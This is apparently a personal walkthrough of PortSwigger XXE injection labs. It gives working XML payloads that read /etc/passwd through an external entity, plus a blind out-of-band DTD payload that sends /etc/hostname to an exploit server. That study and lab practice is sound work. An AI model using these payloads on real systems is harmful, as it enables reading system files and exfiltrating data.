# XML external entity (XXE) injection

Get details at [here](https://portswigger.net/web-security/xxe)

XML (Extensible Markup Language) is a very popular data format. It is used in everything from web services (XML-RPC, SOAP, REST) through documents (XML, HTML, DOCX) to image files (SVG, EXIF data). To interpret XML data, an application needs an XML parser (also known as the XML processor).

---

[Lab 1](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files): exploiting XXE to retrieve files

Description of this lab: inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

Look at any post, it has `check stock` button, try to click, we can see website send a payload like this 

```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The final payload is

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY test SYSTEM "file:///etc/passwd">]>
    <stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>
```

Send it with repeater, and solved the lab.

[Lab 2]()

[Lab 3]()

[Lab 4]()

[Lab 5](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration): XXE with out-of-band exfiltrations

Description of this lab: exfiltrate the contents of the /etc/hostname file but does not display the result

Do the same as lab 1, but we need to send result to exploit server. At exploit server, use this payload like this

```
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0aa6003d04b1a1e6c3f1a78501860030.exploit-server.net/?%file;'>">
```

And payload in repeater

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0aa6003d04b1a1e6c3f1a78501860030.exploit-server.net/exploit">
    %loadDtd;
    %stack;
    %exfil;]<stockCheck>
    <productId>1</productId><storeId>1</storeId></stockCheck>
```
Send it with repeater, then go to access log at exploit server, we can see request like this `GET /?06da3baa945b HTTP/1.1" 200 "User-Agent: Java/17.0.5`, and result is 06da3baa945b. Go back to home and submit, then solved the lab.

